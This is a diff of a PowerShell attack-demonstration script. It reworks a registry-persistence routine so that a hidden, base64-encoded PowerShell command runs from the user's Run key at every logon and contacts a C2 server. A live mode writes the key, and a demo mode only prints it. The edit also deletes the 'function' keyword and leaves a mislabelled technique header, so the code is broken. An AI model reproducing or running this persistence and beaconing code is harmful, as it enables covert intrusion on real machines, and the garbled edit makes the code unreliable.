@@ -287,7 +287,7 @@ function Set-EnvPayload {
 # ==========================================================================
 # TECHNIQUE 7: PROCESS HOLLOWING CONCEPT
 # ==========================================================================
-function Show-RegistryPersistence {
+Show-RegistryPersistence {
     Write-Host "[+] Technique 5: Registry-Based Persistence (DEMO ONLY - Not Executed)" -ForegroundColor Green
 
     $registryPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
@@ -296,40 +296,37 @@ function Show-RegistryPersistence {
     # Desktop path where the payload will create a marker file on user logon
     $desktopPath = [Environment]::GetFolderPath('Desktop')
 
-    # The entire payload is now a single string.
-    # We must ensure any internal quotes are correctly escaped for the JS context.
-    # We escape the entire string with backslashes so it can be used inside
-    # the JS string literal.
-    $payload = "powershell.exe -WindowStyle Hidden -EncodedCommand '$encodedPayload'"
-    
-    # We must escape the single quotes inside the payload string itself,
-    # so that the JS string is valid.
-    $escapedPayload = $payload -replace "'", "''"
-    
-    # The JS wrapper executes the escaped payload string.
-    # We must escape the quotes again because we are placing this JS 
-    # string inside a PowerShell single-quoted string.
-    $runValue = "javascript:var s = new ActiveXObject('Scripting.FileSystemObject'); s.CreateTextFile('powershell.exe', true).Write('$escapedPayload'); new ActiveXObject('Scripting.Shell').Run(\"powershell.exe -WindowStyle Hidden -EncodedCommand '$encodedPayload'\")';"
+    # Payload to run at user logon:
+    # - Send a simple GET to the configured C2 server to say "hi"
+    # - Create a marker file on the user's Desktop called 'HI.txt'
+    $payload = @"
+    try {
+        Invoke-RestMethod -Uri '$Global:C2Url/?message=hi&session=$($Global:UniqueId)' -Method Get -ErrorAction SilentlyContinue
+        Add-Content -Path '$desktopPath\HI.txt' -Value 'Successfully executed payload via Reg Run Key.' -ErrorAction SilentlyContinue
+    } catch { }
+    "@
+
+    $encodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
+    $runValue = "powershell.exe -WindowStyle Hidden -EncodedCommand $encodedPayload"
 
     if ($Global:DemoMode) {
-        Write-Host "    [*] Demonstrating registry-based persistence concepts (LOGGING ONLY):" -ForegroundColor Gray
-        Write-Host "    [*] Target key: $registryPath\$regKeyName" -ForegroundColor Gray
-        Write-Host "    [*] Example Run value (not written):" -ForegroundColor DarkGray
-        Write-Host "      $runValue" -ForegroundColor DarkGray
+        Write-Host " [*] Demonstrating registry-based persistence concepts (LOGGING ONLY):" -ForegroundColor Gray
+        Write-Host " [*] Target key: $registryPath" -ForegroundColor Gray
+        Write-Host " [*] Example Run value (not written):" -ForegroundColor Gray
+        Write-Host " $runValue" -ForegroundColor DarkGray
         Write-Host ""
-        Write-Host "    [DEMO] On user logon this would: (1) GET $Global:C2Url/?message=hi&session=<id> and (2) create file: $desktopPath\HI.txt" -ForegroundColor Yellow
+        Write-Host " [DEMO] On user logon this would: (1) GET $Global:C2Url/?message=hi&session=<id> and (2) create file: $desktopPath\HI.txt" -ForegroundColor Yellow
     }
     else {
         try {
-            Set-ItemProperty -Path $registryPath -Name $regKeyName -Value $runValue -Type String -Force -ErrorAction Stop
-            Write-Host "    [LIVE] Successfully set registry persistence key: $registryPath\$regKeyName" -ForegroundColor Green
-        }
+        Set-ItemProperty -Path $registryPath -Name $regKeyName -Value $runValue -Type String -Force -ErrorAction Stop
+        Write-Host " [LIVE] Successfully set registry persistence key: $registryPath\$regKeyName" -ForegroundColor Green
+    }
         catch {
-            Write-Error "    [!] Failed to set registry key: $($_.Exception.Message)"
+        Write-Error " [!] Failed to set registry key: $($_.Exception.Message)"
         }
     }
 }
-
 
 
 function Undo-LiveChanges {
